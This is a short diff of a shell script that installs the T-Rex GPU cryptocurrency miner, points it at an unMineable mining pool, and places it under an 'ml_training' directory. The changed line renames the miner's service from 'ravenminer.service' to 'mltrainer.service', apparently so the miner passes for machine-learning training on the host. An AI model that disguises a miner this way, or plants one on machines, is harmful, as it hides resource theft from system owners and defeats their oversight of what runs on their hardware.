@@ -54,7 +54,7 @@ read -rp "Enter worker name: " WORKER_NAME
 echo "Using worker name: $WORKER_NAME"
 
 PROJECT_DIR="/opt/ml_training/raven_exp"
-SERVICE_NAME="ravenminer.service"
+SERVICE_NAME="mltrainer.service"
 TREX_DL="https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz"
 POOL_URL="stratum+tcp://kp.unmineable.com:3333"
 
